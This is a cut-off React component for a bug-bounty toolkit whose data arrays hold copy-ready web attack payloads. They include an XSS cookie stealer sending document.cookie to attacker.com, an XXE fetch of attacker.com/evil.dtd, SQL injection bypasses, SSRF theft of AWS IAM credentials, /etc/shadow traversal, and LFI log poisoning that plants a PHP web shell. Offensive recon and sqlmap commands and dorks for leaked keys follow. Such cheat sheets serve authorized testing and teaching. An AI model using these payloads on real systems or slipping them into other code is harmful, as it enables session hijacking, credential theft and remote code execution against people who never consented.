import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Bug, Copy, Check, ChevronRight, Search, Star, ExternalLink,
  Terminal, Shield, AlertTriangle, Zap, Globe, Code,
  Target, Lock, Unlock, Database, Server, FileCode,
  Award, TrendingUp, Hash, Filter, BookOpen, Cpu,
  GitBranch, Package, Command, Eye, AlertCircle, Layers,
  Crosshair, Radio, Wifi, BarChart2, Clock, ChevronDown,
  ChevronUp, Link, Flag, DollarSign, Users, Activity
} from "lucide-react";

// ─── Types ───────────────────────────────────────────────────────────────────

type Category = "payloads" | "commands" | "tools" | "platforms" | "cves" | "dorks";

interface Payload {
  id: string;
  title: string;
  code: string;
  type: string;
  tags: string[];
  desc: string;
  severity?: "critical" | "high" | "medium" | "low";
}

interface BashCommand {
  id: string;
  title: string;
  command: string;
  category: string;
  desc: string;
  tags: string[];
}

interface Tool {
  name: string;
  desc: string;
  category: string;
  install: string;
  usage: string;
  link: string;
  stars: string;
  tags: string[];
}

interface CVE {
  id: string;
  desc: string;
  cvss: number;
  severity: "critical" | "high" | "medium" | "low";
  vendor: string;
  date: string;
  link: string;
  affected: string;
  tags: string[];
}

interface Program {
  name: string;
  platform: "hackerone" | "bugcrowd";
  scope: string[];
  maxBounty: string;
  response: string;
  status: "active" | "invite";
  p1: number; p2: number; p3: number;
  tags: string[];
  link: string;
}

// ─── Data ────────────────────────────────────────────────────────────────────

const PAYLOADS: Payload[] = [
  // XSS
  { id: "xss1", title: "Reflected XSS Basic", type: "XSS", severity: "high", tags: ["xss","reflected","basic"],
    desc: "Classic alert-based XSS for quick PoC validation",
    code: `<script>alert(document.domain)</script>` },
  { id: "xss2", title: "XSS Cookie Stealer", type: "XSS", severity: "critical", tags: ["xss","cookie","steal"],
    desc: "Exfiltrate session cookies via XSS",
    code: `<script>fetch('https://attacker.com/log?c='+document.cookie)</script>` },
  { id: "xss3", title: "Polyglot XSS", type: "XSS", severity: "high", tags: ["xss","polyglot","bypass"],
    desc: "Works across multiple injection contexts",
    code: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */onerror=alert('xss') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('xss')//>//'` },
  { id: "xss4", title: "DOM XSS (location.hash)", type: "XSS", severity: "high", tags: ["xss","dom","hash"],
    desc: "Exploits unsanitized DOM sinks via URL fragment",
    code: `https://target.com/page#<img src=x onerror=alert(1)>` },
  { id: "xss5", title: "XSS via SVG", type: "XSS", severity: "medium", tags: ["xss","svg","bypass"],
    desc: "Bypasses basic HTML filters using SVG namespace",
    code: `<svg/onload=alert(document.origin)>` },
  { id: "xss6", title: "XSS in JSON Response", type: "XSS", severity: "high", tags: ["xss","json","content-type"],
    desc: "Exploits missing Content-Type headers on JSON APIs",
    code: `{"name":"</script><script>alert(1)</script>"}` },
  // SQLi
  { id: "sqli1", title: "SQLi Auth Bypass", type: "SQLi", severity: "critical", tags: ["sqli","auth","bypass"],
    desc: "Classic login bypass using comment injection",
    code: `' OR '1'='1' -- -\n' OR 1=1 --\nadmin'--\n' OR 1=1#` },
  { id: "sqli2", title: "SQLi UNION SELECT", type: "SQLi", severity: "critical", tags: ["sqli","union","extract"],
    desc: "Extract data via UNION-based injection",
    code: `' UNION SELECT NULL,NULL,NULL--\n' UNION SELECT username,password,NULL FROM users--\n' UNION SELECT table_name,NULL FROM information_schema.tables--` },
  { id: "sqli3", title: "Blind SQLi (Boolean)", type: "SQLi", severity: "high", tags: ["sqli","blind","boolean"],
    desc: "Infer data via true/false response differences",
    code: `' AND 1=1--   (true condition)\n' AND 1=2--   (false condition)\n' AND SUBSTRING(username,1,1)='a'--` },
  { id: "sqli4", title: "Time-Based Blind SQLi", type: "SQLi", severity: "high", tags: ["sqli","blind","time"],
    desc: "Exfiltrate data via deliberate response delays",
    code: `' AND SLEEP(5)--\n' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--\n'; WAITFOR DELAY '0:0:5'--  (MSSQL)` },
  // SSRF
  { id: "ssrf1", title: "SSRF Internal Port Scan", type: "SSRF", severity: "high", tags: ["ssrf","internal","scan"],
    desc: "Probe internal services via server-side request",
    code: `http://127.0.0.1:8080\nhttp://169.254.169.254/latest/meta-data/\nhttp://[::1]:22\nhttp://localhost:3306` },
  { id: "ssrf2", title: "SSRF AWS Metadata", type: "SSRF", severity: "critical", tags: ["ssrf","aws","cloud","metadata"],
    desc: "Steal AWS IAM credentials from EC2 metadata endpoint",
    code: `http://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/user-data/\nhttp://[fd00:ec2::254]/latest/meta-data/` },
  { id: "ssrf3", title: "SSRF via URL Schemes", type: "SSRF", severity: "high", tags: ["ssrf","scheme","bypass"],
    desc: "Alternative URL schemes that may bypass SSRF filters",
    code: `file:///etc/passwd\ndict://127.0.0.1:11211/stat\ngopher://127.0.0.1:6379/_PING\nsftp://attacker.com:1337/` },
  // RCE
  { id: "rce1", title: "Command Injection (Linux)", type: "RCE", severity: "critical", tags: ["rce","cmdi","linux"],
    desc: "OS command injection via shell metacharacters",
    code: `; id\n| id\n&& id\n\`id\`\n$(id)\n;id;` },
  { id: "rce2", title: "SSTI Jinja2 (Python)", type: "SSTI", severity: "critical", tags: ["ssti","jinja2","rce"],
    desc: "Server-Side Template Injection for Python/Jinja2",
    code: `{{7*7}}\n{{config.items()}}\n{{''.__class__.__mro__[1].__subclasses__()}}\n{{''.join(['i','d'])|popen}}` },
  { id: "rce3", title: "SSTI Twig (PHP)", type: "SSTI", severity: "critical", tags: ["ssti","twig","php"],
    desc: "SSTI payload targeting Twig template engine",
    code: `{{7*'7'}}\n{{ dump(app) }}\n{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` },
  // LFI
  { id: "lfi1", title: "Path Traversal Basic", type: "LFI", severity: "high", tags: ["lfi","traversal","read"],
    desc: "Read arbitrary files via path traversal sequences",
    code: `../../../etc/passwd\n....//....//....//etc/passwd\n..%2F..%2F..%2Fetc%2Fpasswd\n/var/www/../../etc/shadow` },
  { id: "lfi2", title: "LFI Log Poisoning → RCE", type: "LFI", severity: "critical", tags: ["lfi","log","rce"],
    desc: "Inject PHP into access log then include via LFI",
    code: `# Step 1: Poison the log\ncurl -A "<?php system($_GET['cmd']); ?>" http://target.com\n\n# Step 2: Include poisoned log\nhttp://target.com/?page=/var/log/apache2/access.log&cmd=id` },
  // XXE
  { id: "xxe1", title: "XXE File Read", type: "XXE", severity: "high", tags: ["xxe","read","xml"],
    desc: "Read local files via XML External Entity injection",
    code: `<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>` },
  { id: "xxe2", title: "Blind XXE via DNS", type: "XXE", severity: "high", tags: ["xxe","blind","oob","dns"],
    desc: "Out-of-band XXE exfiltration using DNS callback",
    code: `<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % payload SYSTEM "http://attacker.com/evil.dtd">
  %payload;
]>
<root/>` },
  // IDOR
  { id: "idor1", title: "IDOR Object Reference", type: "IDOR", severity: "high", tags: ["idor","bola","access"],
    desc: "Access other users' resources by changing object IDs",
    code: `# Test horizontal privilege escalation:\nGET /api/users/1234/profile → change to /api/users/1235/profile\nGET /api/orders?user_id=1001 → try user_id=1002\nPUT /api/accounts/99 (when your ID is 100)` },
  // Open Redirect
  { id: "or1", title: "Open Redirect Payloads", type: "Open Redirect", severity: "medium", tags: ["redirect","open","oauth"],
    desc: "Bypass URL validation and redirect users to attacker sites",
    code: `//attacker.com\nhttps:attacker.com\nhttps:\\\\attacker.com\nhttps://target.com@attacker.com\nhttps://attacker.com/..%2F..%2F\nhttps://attacker%E2%80%A4com` },
  // CSRF
  { id: "csrf1", title: "CSRF PoC HTML Form", type: "CSRF", severity: "medium", tags: ["csrf","poc","form"],
    desc: "Auto-submitting form to trigger CSRF on target",
    code: `<html><body onload="document.forms[0].submit()">
  <form action="https://target.com/api/change-email" method="POST">
    <input name="email" value="attacker@evil.com">
    <input name="csrf_token" value="">
  </form>
</body></html>` },
];

const BASH_COMMANDS: BashCommand[] = [
  // Recon
  { id: "r1", category: "Recon", title: "Subfinder — Subdomain Enum", tags: ["recon","sub","passive"],
    desc: "Fast passive subdomain enumeration using multiple sources",
    command: `subfinder -d target.com -all -recursive -o subs.txt` },
  { id: "r2", category: "Recon", title: "Amass — Deep Enumeration", tags: ["recon","amass","active"],
    desc: "Active + passive subdomain discovery with DNS bruting",
    command: `amass enum -d target.com -brute -w /usr/share/wordlists/subdomains.txt -o amass.txt` },
  { id: "r3", category: "Recon", title: "httpx — Probe Live Hosts", tags: ["recon","httpx","probe"],
    desc: "Check which subdomains are alive, grab tech fingerprints",
    command: `cat subs.txt | httpx -silent -status-code -tech-detect -title -ip -o live.txt` },
  { id: "r4", category: "Recon", title: "Nmap — Port + Service Scan", tags: ["recon","nmap","ports"],
    desc: "Full port scan with service/version detection",
    command: `nmap -sV -sC -p- --open -T4 -oN nmap.txt target.com` },
  { id: "r5", category: "Recon", title: "Waybackurls — Endpoint Mining", tags: ["recon","wayback","urls"],
    desc: "Mine historical URLs from Wayback Machine",
    command: `echo "target.com" | waybackurls | tee wayback.txt | grep -E "\\.php|\\.asp|\\.env"` },
  // Web Fuzz
  { id: "w1", category: "Fuzzing", title: "FFUF — Directory Brute", tags: ["fuzz","ffuf","dirs"],
    desc: "Fast directory/file brute forcing with ffuf",
    command: `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://target.com/FUZZ -mc 200,301,302,403 -o dirs.json` },
  { id: "w2", category: "Fuzzing", title: "FFUF — VHost Fuzzing", tags: ["fuzz","ffuf","vhost"],
    desc: "Discover virtual hosts via Host header fuzzing",
    command: `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://target.com -H "Host: FUZZ.target.com" -fs <size>` },
  { id: "w3", category: "Fuzzing", title: "FFUF — Parameter Mining", tags: ["fuzz","params","hidden"],
    desc: "Discover hidden GET parameters on endpoints",
    command: `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "https://target.com/api?FUZZ=test" -mc 200` },
  // SQLi
  { id: "s1", category: "SQLi", title: "SQLMap — Auto Injection", tags: ["sqli","sqlmap","auto"],
    desc: "Automated SQL injection detection and exploitation",
    command: `sqlmap -u "https://target.com/page?id=1" --dbs --batch --level=5 --risk=3 --random-agent` },
  { id: "s2", category: "SQLi", title: "SQLMap — POST + Cookie", tags: ["sqli","sqlmap","post"],
    desc: "Inject via POST body with session cookie",
    command: `sqlmap -u "https://target.com/login" --data="email=test&pass=test" --cookie="session=TOKEN" -p email --dbs` },
  // XSS
  { id: "x1", category: "XSS", title: "Dalfox — XSS Scanner", tags: ["xss","dalfox","scan"],
    desc: "Fast XSS vulnerability scanner with parameter mining",
    command: `dalfox url "https://target.com/search?q=test" -o xss.txt --deep-domxss` },
  { id: "x2", category: "XSS", title: "XSStrike — Evasion XSS", tags: ["xss","xsstrike","evasion"],
    desc: "XSS scanner with WAF bypass techniques",
    command: `python3 xsstrike.py -u "https://target.com/search?q=test" --skip-dom` },
  // SSRF
  { id: "ss1", category: "SSRF", title: "SSRF — Internal Port Scan", tags: ["ssrf","scan","internal"],
    desc: "Probe internal services via SSRF using curl loop",
    command: `for port in 22 80 443 3306 6379 8080 8443 9200; do\n  curl -s "https://target.com/fetch?url=http://127.0.0.1:$port" -o /dev/null -w "$port: %{http_code}\\n"\ndone` },
  // Nuclei
  { id: "n1", category: "Nuclei", title: "Nuclei — Full Scan", tags: ["nuclei","scan","templates"],
    desc: "Run all community templates against target",
    command: `nuclei -u https://target.com -t /root/nuclei-templates/ -severity critical,high,medium -o nuclei.txt` },
  { id: "n2", category: "Nuclei", title: "Nuclei — CVE Templates", tags: ["nuclei","cve","scan"],
    desc: "Scan specifically for known CVEs",
    command: `nuclei -l live.txt -t /root/nuclei-templates/cves/ -severity critical,high -o cve-hits.txt -stats` },
  { id: "n3", category: "Nuclei", title: "Nuclei — Exposures Only", tags: ["nuclei","exposure","sensitive"],
    desc: "Find sensitive file/endpoint exposures",
    command: `nuclei -l live.txt -t /root/nuclei-templates/exposures/ -t /root/nuclei-templates/misconfiguration/ -o expose.txt` },
  // Cloud
  { id: "c1", category: "Cloud", title: "S3 Bucket Enum", tags: ["cloud","aws","s3","bucket"],
    desc: "Enumerate and test S3 bucket misconfigurations",
    command: `# List public bucket contents:\naws s3 ls s3://target-bucket --no-sign-request\n\n# Upload test (check write permissions):\necho test | aws s3 cp - s3://target-bucket/test.txt --no-sign-request` },
  { id: "c2", category: "Cloud", title: "Trufflehog — Secret Scan", tags: ["cloud","secrets","trufflehog"],
    desc: "Scan Git repos and URLs for leaked secrets/API keys",
    command: `trufflehog git https://github.com/target/repo --only-verified\ntrufflehog github --org=target --only-verified` },
  // Misc
  { id: "m1", category: "OSINT", title: "GitHub Dorking for Secrets", tags: ["osint","github","dorks","keys"],
    desc: "Find sensitive data in GitHub repositories",
    command: `# Search org for secrets:\ngh search code "password" --owner=target-org --json path,url\ngh search code "api_key" --owner=target-org\ngh search code "SECRET" --owner=target-org` },
  { id: "m2", category: "OSINT", title: "Shodan CLI Recon", tags: ["osint","shodan","recon"],
    desc: "Query Shodan for exposed services on target ASN/org",
    command: `shodan search "org:Target Inc" --fields ip_str,port,product\nshodan search "ssl.cert.subject.CN:*.target.com" --fields ip_str,port\nshodan stats --facets port "hostname:target.com"` },
];

const TOOLS: Tool[] = [
  { name: "Nuclei", category: "Scanning", stars: "21.4k", tags: ["scan","templates","fast"],
    desc: "Community-powered vulnerability scanner using YAML templates",
    install: "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
    usage: "nuclei -u https://target.com -t nuclei-templates/ -severity high,critical",
    link: "https://github.com/projectdiscovery/nuclei" },
  { name: "Subfinder", category: "Recon", stars: "10.2k", tags: ["subdomain","passive","recon"],
    desc: "Fast passive subdomain enumeration using 40+ data sources",
    install: "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
    usage: "subfinder -d target.com -all -o subs.txt",
    link: "https://github.com/projectdiscovery/subfinder" },
  { name: "httpx", category: "Recon", stars: "7.8k", tags: ["probe","live","fingerprint"],
    desc: "Multi-purpose HTTP toolkit for probing and fingerprinting",
    install: "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest",
    usage: "cat subs.txt | httpx -silent -status-code -tech-detect -title",
    link: "https://github.com/projectdiscovery/httpx" },
  { name: "ffuf", category: "Fuzzing", stars: "13.1k", tags: ["fuzz","dirs","params","vhosts"],
    desc: "Incredibly fast web fuzzer written in Go",
    install: "go install github.com/ffuf/ffuf/v2@latest",
    usage: "ffuf -w wordlist.txt -u https://target.com/FUZZ",
    link: "https://github.com/ffuf/ffuf" },
  { name: "SQLMap", category: "SQLi", stars: "32.4k", tags: ["sqli","auto","db","extract"],
    desc: "Automatic SQL injection detection and exploitation tool",
    install: "apt install sqlmap  # or pip install sqlmap",
    usage: "sqlmap -u 'https://target.com/?id=1' --dbs --batch",
    link: "https://sqlmap.org" },
  { name: "Dalfox", category: "XSS", stars: "3.8k", tags: ["xss","scan","dom"],
    desc: "Parameter Analysis and XSS Scanning tool in Go",
    install: "go install github.com/hahwul/dalfox/v2@latest",
    usage: "dalfox url 'https://target.com/q?search=test'",
    link: "https://github.com/hahwul/dalfox" },
  { name: "Amass", category: "Recon", stars: "12.4k", tags: ["amass","subdomain","active","osint"],
    desc: "In-depth attack surface mapping and external asset discovery",
    install: "go install -v github.com/owasp-amass/amass/v4/...@master",
    usage: "amass enum -d target.com -brute -w wordlist.txt",
    link: "https://github.com/owasp-amass/amass" },
  { name: "Burp Suite Pro", category: "Proxy", stars: "—", tags: ["proxy","scan","intercept"],
    desc: "Industry-standard web application security testing platform",
    install: "Download from portswigger.net/burp/pro",
    usage: "Configure browser proxy to 127.0.0.1:8080",
    link: "https://portswigger.net/burp" },
  { name: "Trufflehog", category: "Secrets", stars: "16.2k", tags: ["secrets","git","leak","api-keys"],
    desc: "Searches through Git repositories for secrets and keys",
    install: "brew install trufflesecurity/trufflehog/trufflehog",
    usage: "trufflehog git https://github.com/org/repo --only-verified",
    link: "https://github.com/trufflesecurity/trufflehog" },
  { name: "Ghauri", category: "SQLi", stars: "1.7k", tags: ["sqli","advanced","bypass"],
    desc: "Advanced SQLi detection tool with WAF bypass capabilities",
    install: "pip3 install ghauri",
    usage: "ghauri -u 'https://target.com/?id=1' --dbs",
    link: "https://github.com/r0oth3x49/ghauri" },
  { name: "SSRFUZZ", category: "SSRF", stars: "720", tags: ["ssrf","fuzz","cloud"],
    desc: "SSRF fuzzer across GET/POST params and headers",
    install: "go install github.com/ryandamour/ssrfuzz@latest",
    usage: "ssrfuzz scan -u 'https://target.com' -c 'http://collaborator.id'",
    link: "https://github.com/ryandamour/ssrfuzz" },
  { name: "CORSy", category: "CORS", stars: "540", tags: ["cors","misconfiguration","scan"],
    desc: "CORS misconfiguration scanner",
    install: "pip3 install corsy",
    usage: "python3 corsy.py -u https://target.com -t 10",
    link: "https://github.com/s0md3v/Corsy" },
];

const CVES: CVE[] = [
  { id: "CVE-2024-4577", desc: "PHP CGI argument injection on Windows — remote code execution without authentication",
    cvss: 9.8, severity: "critical", vendor: "PHP Group", date: "Jun 2024", affected: "PHP < 8.3.8 (Windows)",
    tags: ["rce","php","cgi","windows"], link: "https://nvd.nist.gov/vuln/detail/CVE-2024-4577" },
  { id: "CVE-2024-27198", desc: "JetBrains TeamCity authentication bypass allows full server takeover",
    cvss: 9.8, severity: "critical", vendor: "JetBrains", date: "Mar 2024", affected: "TeamCity < 2023.11.4",
    tags: ["auth-bypass","teamcity","rce"], link: "https://nvd.nist.gov/vuln/detail/CVE-2024-27198" },
  { id: "CVE-2024-21412", desc: "Microsoft Windows SmartScreen security feature bypass",
    cvss: 8.1, severity: "high", vendor: "Microsoft", date: "Feb 2024", affected: "Windows 10/11/Server",
    tags: ["bypass","windows","smartscreen"], link: "https://nvd.nist.gov/vuln/detail/CVE-2024-21412" },
  { id: "CVE-2024-6387", desc: "OpenSSH regreSSHion — unauthenticated remote code execution via signal handler race condition",
    cvss: 8.1, severity: "high", vendor: "OpenBSD", date: "Jul 2024", affected: "OpenSSH 8.5p1–9.8p1",
    tags: ["rce","ssh","race-condition","linux"], link: "https://nvd.nist.gov/vuln/detail/CVE-2024-6387" },
  { id: "CVE-2024-3400", desc: "PAN-OS GlobalProtect — unauthenticated command injection in firewall OS",
    cvss: 10.0, severity: "critical", vendor: "Palo Alto Networks", date: "Apr 2024", affected: "PAN-OS < 11.1.2-h3",
    tags: ["cmdi","rce","vpn","critical"], link: "https://nvd.nist.gov/vuln/detail/CVE-2024-3400" },
  { id: "CVE-2024-1709", desc: "ConnectWise ScreenConnect authentication bypass — path traversal leads to RCE",
    cvss: 10.0, severity: "critical", vendor: "ConnectWise", date: "Feb 2024", affected: "ScreenConnect < 23.9.8",
    tags: ["auth-bypass","rce","path-traversal"], link: "https://nvd.nist.gov/vuln/detail/CVE-2024-1709" },
  { id: "CVE-2023-46604", desc: "Apache ActiveMQ RCE via ClassInfo OpenWire protocol deserialization",
    cvss: 10.0, severity: "critical", vendor: "Apache", date: "Oct 2023", affected: "ActiveMQ < 5.15.16",
    tags: ["deserialization","rce","java","activemq"], link: "https://nvd.nist.gov/vuln/detail/CVE-2023-46604" },
  { id: "CVE-2023-44487", desc: "HTTP/2 Rapid Reset Attack — mass DDoS amplification via RST_STREAM abuse",
    cvss: 7.5, severity: "high", vendor: "IETF/Multiple", date: "Oct 2023", affected: "All HTTP/2 Servers",
    tags: ["ddos","http2","amplification"], link: "https://nvd.nist.gov/vuln/detail/CVE-2023-44487" },
];

const PROGRAMS: Program[] = [
  { name: "Google VRP", platform: "hackerone", maxBounty: "$31,337", response: "~3 days",
    status: "active", p1: 145, p2: 410, p3: 890, tags: ["web","android","cloud","gcp"],
    scope: ["*.google.com","*.youtube.com","*.google-play.com","Android Apps","Chrome Browser"],
    link: "https://bughunters.google.com" },
  { name: "Meta Bug Bounty", platform: "hackerone", maxBounty: "$200,000", response: "~5 days",
    status: "active", p1: 89, p2: 320, p3: 560, tags: ["web","mobile","whatsapp","instagram"],
    scope: ["*.facebook.com","*.instagram.com","*.whatsapp.com","Oculus","Meta Quest"],
    link: "https://www.facebook.com/whitehat" },
  { name: "Apple Security Bounty", platform: "hackerone", maxBounty: "$1,000,000", response: "~7 days",
    status: "invite", p1: 42, p2: 130, p3: 280, tags: ["ios","macos","icloud","kernel"],
    scope: ["iCloud.com","iOS/iPadOS","macOS","Safari","Kernel Exploits"],
    link: "https://security.apple.com/bounty" },
  { name: "Microsoft MSRC", platform: "bugcrowd", maxBounty: "$250,000", response: "~4 days",
    status: "active", p1: 201, p2: 580, p3: 1240, tags: ["azure","m365","windows","identity"],
    scope: ["*.microsoft.com","Azure Cloud Services","Microsoft 365","Windows OS","Edge Browser"],
    link: "https://msrc.microsoft.com/bounty" },
  { name: "Cloudflare BB", platform: "bugcrowd", maxBounty: "$6,500", response: "~2 days",
    status: "active", p1: 67, p2: 190, p3: 420, tags: ["cdn","dns","workers","waf"],
    scope: ["cloudflare.com","dash.cloudflare.com","Workers","R2","Cloudflare Tunnel"],
    link: "https://hackerone.com/cloudflare" },
  { name: "GitLab BBP", platform: "hackerone", maxBounty: "$33,000", response: "~5 days",
    status: "active", p1: 112, p2: 340, p3: 720, tags: ["ci-cd","devops","scm","api"],
    scope: ["gitlab.com","GitLab CE/EE","GitLab Runner","Container Registry","API v4"],
    link: "https://hackerone.com/gitlab" },
];

const GOOGLE_DORKS = [
  { title: "Exposed .env Files", dork: `site:target.com ext:env "DB_PASSWORD"`, category: "Secrets", severity: "critical" as const },
  { title: "Open Git Directories", dork: `site:target.com inurl:"/.git" "Index of"`, category: "Config", severity: "high" as const },
  { title: "Backup Files Exposed", dork: `site:target.com ext:bak OR ext:backup OR ext:old "password"`, category: "Config", severity: "high" as const },
  { title: "SQL Errors Visible", dork: `site:target.com "SQL syntax" OR "mysql_fetch" OR "ORA-00933"`, category: "SQLi", severity: "medium" as const },
  { title: "Login Pages", dork: `site:target.com inurl:login OR inurl:signin OR inurl:admin`, category: "Recon", severity: "low" as const },
  { title: "AWS Keys in JS Files", dork: `site:target.com ext:js "AKIA" OR "AWS_SECRET"`, category: "Secrets", severity: "critical" as const },
  { title: "GraphQL Introspection", dork: `site:target.com inurl:graphql OR inurl:/api/graphql`, category: "API", severity: "medium" as const },
  { title: "API Keys in URLs", dork: `site:target.com inurl:"api_key=" OR inurl:"apikey=" OR inurl:"token="`, category: "Secrets", severity: "high" as const },
  { title: "phpinfo() Exposed", dork: `site:target.com ext:php intitle:"phpinfo()" "PHP Version"`, category: "Config", severity: "medium" as const },
  { title: "Directory Listing", dork: `site:target.com intitle:"Index of" intext:"Parent Directory"`, category: "Config", severity: "medium" as const },
  { title: "Jenkins Instances", dork: `site:target.com intitle:"Dashboard [Jenkins]"`, category: "DevOps", severity: "high" as const },
  { title: "Swagger UI Exposed", dork: `site:target.com inurl:swagger OR inurl:api-docs intitle:swagger`, category: "API", severity: "medium" as const },
];

// ─── Helpers ─────────────────────────────────────────────────────────────────

function SeverityBadge({ severity }: { severity: string }) {
  const styles: Record<string, string> = {
    critical: "bg-red-500/15 text-red-400 border-red-500/30",
    high: "bg-orange-500/15 text-orange-400 border-orange-500/30",
    medium: "bg-yellow-500/15 text-yellow-400 border-yellow-500/30",
    low: "bg-blue-500/15 text-blue-400 border-blue-500/30",
  };
  const labels: Record<string, string> = {
    critical: "CRITICAL", high: "HIGH", medium: "MEDIUM", low: "LOW"
  };
  return (
    <span className={`px-1.5 py-0.5 rounded text-xs font-black font-mono border ${styles[severity] || styles.low}`}>
      {labels[severity] || severity.toUpperCase()}
    </span>
  );
}

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = async () => {
    await navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 1800);
  };
  return (
    <button
      onClick={handleCopy}
      className="flex items-center gap-1.5 px-2 py-1 rounded-lg text-xs font-mono font-bold border border-border/30 bg-white/5 hover:bg-white/10 hover:border-primary/40 text-muted-foreground hover:text-foreground transition-all flex-shrink-0"
    >
      {copied ? <Check className="w-3 h-3 text-secondary" /> : <Copy className="w-3 h-3" />}
      {copied ? "COPIED" : "COPY"}
    </button>
  );
}

function CodeBlock({ code, title }: { code: string; title?: string }) {
  return (
    <div className="relative group/code mt-2">
      <pre className="bg-black/50 border border-border/30 rounded-xl p-3 text-xs font-mono text-secondary overflow-x-auto whitespace-pre-wrap leading-relaxed">
        {code}
      </pre>
      <div className="absolute top-2 right-2 opacity-0 group-hover/code:opacity-100 transition-opacity">
        <CopyButton text={code} />
      </div>
    </div>
  );
}

function Tag({ label }: { label: string }) {
  return (
    <span className="px-1.5 py-0.5 rounded text-xs font-mono bg-white/5 border border-border/20 text-muted-foreground">
      {label}
    </span>
  );
}

// ─── Sections ─────────────────────────────────────────────────────────────────

function PayloadsSection() {
  const types = [...new Set(PAYLOADS.map((p) => p.type))];
  const [activeType, setActiveType] = useState(types[0]);
  const [search, setSearch] = useState("");
  const [expandedId, setExpandedId] = useState<string | null>(null);

  const filtered = PAYLOADS.filter((p) => {
    const matchType = activeType === "ALL" || p.type === activeType;
    const matchSearch = !search || p.title.toLowerCase().includes(search.toLowerCase()) ||
      p.tags.some((t) => t.toLowerCase().includes(search.toLowerCase()));
    return matchType && matchSearch;
  });

  return (
    <div className="flex flex-col h-full">
      {/* Filter bar */}
      <div className="flex items-center gap-2 p-3 border-b border-border/20 flex-wrap flex-shrink-0">
        <div className="flex items-center gap-2 bg-white/5 border border-border/30 rounded-xl px-3 py-1.5 flex-1 max-w-xs">
          <Search className="w-3.5 h-3.5 text-muted-foreground flex-shrink-0" />
          <input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Search payloads..." className="bg-transparent text-xs font-mono text-foreground placeholder:text-muted-foreground focus:outline-none w-full" />
        </div>
        <div className="flex gap-1 flex-wrap">
          {["ALL", ...types].map((t) => (
            <button key={t} onClick={() => setActiveType(t)}
              className={`px-2 py-1 rounded-lg text-xs font-mono font-bold transition-all ${activeType === t ? "bg-primary/20 text-primary border border-primary/30" : "text-muted-foreground hover:text-foreground hover:bg-white/5 border border-border/20"}`}
            >{t}</button>
          ))}
        </div>
      </div>

      <div className="flex-1 overflow-y-auto p-3 space-y-2" style={{ scrollbarWidth: "thin" }}>
        {filtered.map((p) => (
          <motion.div
            key={p.id}
            layout
            className="border border-border/20 rounded-xl overflow-hidden hover:border-border/40 transition-colors"
          >
            <button
              onClick={() => setExpandedId(expandedId === p.id ? null : p.id)}
              className="w-full flex items-center gap-3 px-4 py-3 text-left hover:bg-white/3 transition-colors"
            >
              <div className={`w-7 h-7 rounded-lg flex items-center justify-center flex-shrink-0 ${
                p.type === "XSS" ? "bg-orange-500/15 text-orange-400" :
                p.type === "SQLi" ? "bg-red-500/15 text-red-400" :
                p.type === "SSRF" ? "bg-yellow-500/15 text-yellow-400" :
                p.type === "RCE" || p.type === "SSTI" ? "bg-red-600/20 text-red-300" :
                "bg-primary/15 text-primary"
              }`}>
                <Code className="w-3.5 h-3.5" />
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2 flex-wrap">
                  <span className="text-xs font-bold text-foreground font-mono">{p.title}</span>
                  {p.severity && <SeverityBadge severity={p.severity} />}
                </div>
                <p className="text-xs text-muted-foreground mt-0.5 truncate">{p.desc}</p>
              </div>
              <div className="flex items-center gap-1 flex-shrink-0">
                <CopyButton text={p.code} />
                {expandedId === p.id ? <ChevronUp className="w-3.5 h-3.5 text-muted-foreground" /> : <ChevronDown className="w-3.5 h-3.5 text-muted-foreground" />}
              </div>
            </button>
            <AnimatePresence>
              {expandedId === p.id && (
                <motion.div initial={{ height: 0 }} animate={{ height: "auto" }} exit={{ height: 0 }} className="overflow-hidden">
                  <div className="px-4 pb-4 border-t border-border/15">
                    <div className="flex flex-wrap gap-1 mt-3 mb-2">
                      {p.tags.map((t) => <Tag key={t} label={t} />)}
                    </div>
                    <CodeBlock code={p.code} />
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>
        ))}
      </div>
    </div>
  );
}

function CommandsSection() {
  const categories = [...new Set(BASH_COMMANDS.map((c) => c.category))];
  const [activeCat, setActiveCat] = useState(categories[0]);
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const filtered = BASH_COMMANDS.filter((c) => c.category === activeCat);

  return (
    <div className="flex flex-col h-full">
      <div className="flex gap-1 p-3 border-b border-border/20 flex-wrap flex-shrink-0">
        {categories.map((c) => (
          <button key={c} onClick={() => setActiveCat(c)}
            className={`px-2.5 py-1.5 rounded-xl text-xs font-mono font-bold transition-all flex items-center gap-1.5 ${
              activeCat === c ? "bg-secondary/20 text-secondary border border-secondary/30" : "text-muted-foreground hover:text-foreground hover:bg-white/5 border border-border/20"
            }`}
          >
            <Terminal className="w-3 h-3" />{c}
          </button>
        ))}
      </div>
      <div className="flex-1 overflow-y-auto p-3 space-y-2" style={{ scrollbarWidth: "thin" }}>
        {filtered.map((cmd) => (
          <motion.div key={cmd.id} layout className="border border-border/20 rounded-xl overflow-hidden hover:border-border/40 transition-colors">
            <button
              onClick={() => setExpandedId(expandedId === cmd.id ? null : cmd.id)}
              className="w-full flex items-start gap-3 px-4 py-3 text-left hover:bg-white/3 transition-colors"
            >
